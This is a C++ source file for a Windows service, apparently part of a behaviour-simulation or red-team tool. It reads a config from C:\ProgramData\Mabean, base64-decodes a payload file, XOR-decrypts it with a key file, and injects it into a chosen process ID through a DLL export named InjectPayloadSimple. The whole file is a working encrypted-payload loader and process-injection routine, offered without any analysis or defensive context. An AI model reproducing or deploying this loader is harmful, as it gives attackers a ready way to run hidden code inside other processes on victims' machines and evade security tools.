
#define _CRT_SECURE_NO_WARNINGS 

#include <iostream>
#include <fstream>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <json.hpp>
#include <base64.hpp>


#define SLEEP_TIME 5000

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE hStatus;

typedef void (*StepCallback)(const char* stepName, int stepIndex);
typedef int (*InjectPayloadSimple)(DWORD, unsigned char*, unsigned int, StepCallback);

wchar_t serviceName[] = L"";

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);
std::vector<uint8_t> readBinaryFile(const std::string& path);
std::vector<uint8_t> xorDecrypt(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key);

void AppendLog(const std::string& message)
{
    std::ofstream logFile("C:\\TEMP\\service_log.txt", std::ios_base::app);
    if (logFile.is_open()) {
        logFile << message << std::endl;
        logFile.flush();
    }
}

int main()
{
    AppendLog("Main function started!");

    SERVICE_TABLE_ENTRYW ServiceTable[] = {
        {serviceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcherW(ServiceTable)) {
        AppendLog("StartServiceCtrlDispatcher failed with error: " + std::to_string(GetLastError()));
    }

    AppendLog("Main function exiting...");
    return 0;
}

void ServiceMain(int argc, char** argv)
{
    serviceStatus.dwServiceType = SERVICE_WIN32;
    serviceStatus.dwCurrentState = SERVICE_START_PENDING;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    serviceStatus.dwWin32ExitCode = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;

    hStatus = RegisterServiceCtrlHandler(serviceName, (LPHANDLER_FUNCTION)ControlHandler);

    AppendLog("Service has started");

    std::string keyPath("C:\\ProgramData\\Mabean\\key.bin");
	std::ifstream jsonFile("C:\\ProgramData\\Mabean\\SessionConfig\\config.json");

    if (!jsonFile.is_open()) {
        AppendLog("Failed to open file: C:\\ProgramData\\Mabean\\SessionConfig\\config.json");
        return;
    }

    AppendLog("Json file found");

    nlohmann::json j;
    jsonFile >> j;

	std::string behaviorName = j["BehaviorName"];
	std::string dllPath = j["DllPath"];
	std::string payloadPath = j["PayloadPath"];

    std::vector<uint8_t> key = readBinaryFile(keyPath);

    AppendLog("Key file read");
    
    if (behaviorName == "Injection-Simple") {
        HMODULE hDll = LoadLibraryA(dllPath.c_str());
        if (!hDll)
        {
            AppendLog("Failed to load DLL: " + dllPath);
            return;
        }

        AppendLog("Dll loaded");

		int targetPID = j["TargetPID"].get<int>();
        std::ifstream payloadFile(payloadPath);
        std::string encoded((std::istreambuf_iterator<char>(payloadFile)),
            std::istreambuf_iterator<char>());

        AppendLog("Payload loaded");

        auto payload = base64::decode_into<std::vector<uint8_t>>(encoded);

        AppendLog("Payload decoded");

        auto decrypted = xorDecrypt(payload, key);
        int length = decrypted.size();

        AppendLog("Payload decrypted");

        InjectPayloadSimple inject =
            (InjectPayloadSimple)GetProcAddress(hDll, "InjectPayloadSimple");

        AppendLog("Get ProcAddress");

        AppendLog("Target PID: " + std::to_string(targetPID));

        int result = inject(
            targetPID,
            decrypted.data(),
            static_cast<unsigned int>(decrypted.size()),
            nullptr
        );

        AppendLog("Injection result: " + std::to_string(result));

        FreeLibrary(hDll);

    }
    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &serviceStatus);

    while (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
        Sleep(SLEEP_TIME);
    }
    return;
}

void ControlHandler(DWORD request)
{
    switch (request) {
    case SERVICE_CONTROL_STOP:
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &serviceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &serviceStatus);
        return;

    default:
        break;
    }
    SetServiceStatus(hStatus, &serviceStatus);
    return;
}

std::vector<uint8_t> readBinaryFile(const std::string& path)
{
    std::ifstream file(path, std::ios::binary);
    return std::vector<uint8_t>((std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>());
}

std::vector<uint8_t> xorDecrypt(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key)
{
    std::vector<uint8_t> result(data.size());
    for (size_t i = 0; i < data.size(); i++)
        result[i] = data[i] ^ key[i % key.size()];
    return result;
}